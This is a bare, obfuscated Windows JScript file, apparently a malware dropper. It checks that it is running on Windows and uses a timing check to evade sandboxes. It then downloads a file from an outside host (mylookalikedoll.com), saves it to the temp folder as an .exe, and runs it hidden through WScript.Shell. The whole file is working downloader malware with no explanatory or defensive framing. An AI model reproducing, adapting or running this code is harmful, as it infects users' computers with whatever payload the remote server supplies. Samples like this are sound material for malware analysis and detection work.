var _V2 = false;
var _WV = "CreateObject";
var _U0 = function _H() {return WScript[_WV]("WScript"+".Shell");}(), _B0 = 11;
var _E0 = "MSXML2.XMLHTTP";
var _U = 2123213;
var _W = 0;
function _N(_E1){_U0["Run"](_E1, _W, _W);};
function _WQ(){return _E0 + "";};
function _E(_XF, _I0){_W = _W * 1; return _XF - _I0;};
function _PN(){return _WV;};
/*@cc_on
  @if (@_win32 || @_win64)
    _V2 = true;
  @end
@*/
if (_V2)
{
var _Z = "";
function _Y(){return 22;};
var _I = 0; var _OP = 0;
function _JV()
{
var _V1 = new this["Date"]();
var _K = _V1["getUTCMilliseconds"]();
WScript["Sleep"](_Y());
var _V1 = new this["Date"]();
var _L = _V1["getUTCMilliseconds"]();
WScript["Sleep"](_Y());
var _V1 = new this["Date"]();
var _F0 = _V1["getUTCMilliseconds"]();
var _I = "_F";
_I = _E(_L, _K);
var _OP = "_GC";
_OP = _E(_F0, _L);
_Z = "open";
return _E(_I, _OP);
}
var _W0 = false;
var _KH = false;
for (var _EV = _W; _EV < _Y() * 1; _EV++){if (_JV() != _W){
_W0 = true; 
_OP = "31" + 11 * _I + _OP; 
_KH = true; 
break;
}}
function _T() {return ((_W0 == true) && (_W0 == _KH)) ? 1 : _W;};
if (_W0 && _T() && _KH){
function _V() {return _U0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ue24vUQf.ex" + "e";};
 _UC = _WQ();
 _CC = WScript[_WV](_UC);
 var _YN = 1;
 while (_YN){
try {
	if (_YN == 1)
	{
		_CC[_Z]("GET", "http://mylookalikedoll.com/n2iks", false);
		_CC["send"]();
		_B = "Sleep";
	}
	WScript[_B](_Y() + 120); 
	if (_CC["readystate"] < 2 * 2) continue;
	_YN = _W;
	function _V0(_NW) {var _T0 = (1, 2, 3, 4, 5, _NW); return _T0;};
	_TK = WScript[_PN()]("ADODB.Stream");
	_UC = _TK;
	_UC[_Z]();
	_UC["type"] = _V0(1);
	_UC["write"](_CC["ResponseBody"]);
	_TK["position"] = _V0(_W);
	_UC["Save" + "ToFile"](_V(), 2);
	_TK["cl"+"ose"]();
	_Q = _V();
	_N(_Q);
} catch(_SV){};
}
}
}

